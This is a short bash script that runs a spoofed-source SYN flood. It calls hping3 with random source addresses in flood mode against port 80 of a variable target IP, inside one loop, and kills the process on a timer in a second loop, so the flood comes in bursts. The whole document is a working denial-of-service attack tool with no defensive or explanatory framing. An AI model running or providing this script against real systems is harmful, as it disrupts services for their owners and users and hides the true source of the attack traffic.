#!/bin/bash

{
while sleep 30; do
  sudo hping3 --rand-source --flood -S $Target_IP_address -p 80 -d 1024
done
} &

{
while sleep 60; do
  sudo killall -9 hping3
done
} &

wait
